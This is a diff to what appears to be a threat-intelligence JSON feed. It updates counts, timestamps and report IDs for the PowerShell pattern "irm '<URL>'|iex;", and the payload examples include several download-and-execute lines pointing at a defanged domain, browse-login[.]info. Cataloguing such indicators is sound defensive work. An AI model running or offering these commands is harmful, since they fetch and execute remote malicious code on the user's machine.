@@ -170,10 +170,10 @@
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 51,
-    "ReportCount": 51,
+    "DistinctPayloadCount": 52,
+    "ReportCount": 52,
     "FirstSeen": "2026-11-19T18:53:30.900000+00:00",
-    "LastSeen": "2026-11-26T15:12:41.320000+00:00",
+    "LastSeen": "2026-11-26T16:00:18.255000+00:00",
     "ReportIds": [
       "cmwnwrsgu1xi10omlj9jbvrk0",
       "cmwo69tad1xsb0omltg23i5hb",
@@ -225,10 +225,12 @@
       "cmwx071yw0c8v0omlp9z99b26",
       "cmwx5xlvf0dhd0omlllskz3uu",
       "cmwx9xrcu0dyy0omlur2m2nt0",
-      "cmwxoyrm40fd70oml5xlrq4dq"
+      "cmwxoyrm40fd70oml5xlrq4dq",
+      "cmwxqo0010fn10omlohd8wq8e"
     ],
     "PayloadExamples": [
       "irm 'browse-login[.]info/083af9e16202853f'|iex;",
+      "irm 'browse-login[.]info/2b4f13a0ca6dcdfe'|iex;",
       "irm 'browse-login[.]info/4ecdb196ede70a4a'|iex;",
       "irm 'browse-login[.]info/55f33c8c387348f5'|iex;",
       "irm 'browse-login[.]info/5f9f679de6720a09'|iex;",
